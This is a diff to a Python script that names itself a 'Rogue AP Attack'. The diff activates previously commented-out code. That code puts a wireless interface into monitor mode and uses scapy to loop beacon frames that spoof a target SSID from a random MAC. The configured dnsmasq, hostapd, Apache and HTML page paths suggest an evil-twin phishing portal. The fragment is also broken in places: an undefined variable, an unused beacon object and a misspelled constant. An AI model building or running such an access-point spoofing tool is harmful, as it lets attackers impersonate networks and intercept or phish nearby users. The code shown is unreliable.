@@ -12,7 +12,7 @@ DNSMASQ_CONF = "/tmp/dnsmasq.conf"
 HOSTAPD_CONF = "/tmp/hostapd.conf"
 HTML_PAGE =  "./index.html"
 
-""" 
+
 class WfiRguAP:
     def monitor_mode(self, interface):
         print(f"[+] Activation Monitor mode on {interface}")
@@ -24,11 +24,11 @@ class WfiRguAP:
             print(f"[-] Error during configuration of monitor mode")
             sys.exit(1)
 
- """
 
 
 
-""" def interface(target_ssid, target_MAC):
+
+def interface(target_ssid, target_MAC):
     iface = "wlan0mon"
     sender_mac =  RandMAC()
     ssid = target_ssid
@@ -36,9 +36,9 @@ class WfiRguAP:
     beacon = Dot11Beacon()
     essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
     frame= RadioTap()/dot11/essid
-    sendp(frame, inter=0.1,iface=iface, loop=1) """
+    sendp(frame, inter=0.1,iface=iface, loop=1) 
 
-"""  parser = argparse.ArgumentParser(
+    parser = argparse.ArgumentParser(
     prog=' Wfi Rgue AP',
     description='Rogue AP Attack')
 
@@ -47,7 +47,7 @@ class WfiRguAP:
     parser.add_argument('-m', '--monitor', required=True, help='Monitor mode')
     parser.add_argument('-c', '--channel', type=int, default=DEAULT_CHANNEL)
 
-    args = parser.parse_args() """
+    args = parser.parse_args()
 
 
 def init_apache2():
